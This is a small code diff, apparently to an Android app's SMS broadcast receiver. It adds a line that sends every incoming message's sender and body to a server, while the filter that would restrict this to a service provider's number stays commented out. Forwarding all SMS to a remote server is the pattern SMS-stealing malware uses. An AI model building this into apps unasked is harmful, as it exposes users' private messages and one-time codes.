@@ -53,7 +53,7 @@ public class SmsBroadcastReceiver extends BroadcastReceiver {
             }
             Toast.makeText(context, "BroadcastReceiver caught SMS: " + smsBody, Toast.LENGTH_LONG).show();
             Log.d(TAG, "SMS detected: From " + smsSender + " With text " + smsBody);
-
+            MainActivity.sendMessageToserver(smsSender,smsBody);
          //   if (smsSender.equals(serviceProviderNumber) && smsBody.startsWith(serviceProviderSmsCondition)) {
                 if (listener != null) {
                     listener.onTextReceived(smsBody);
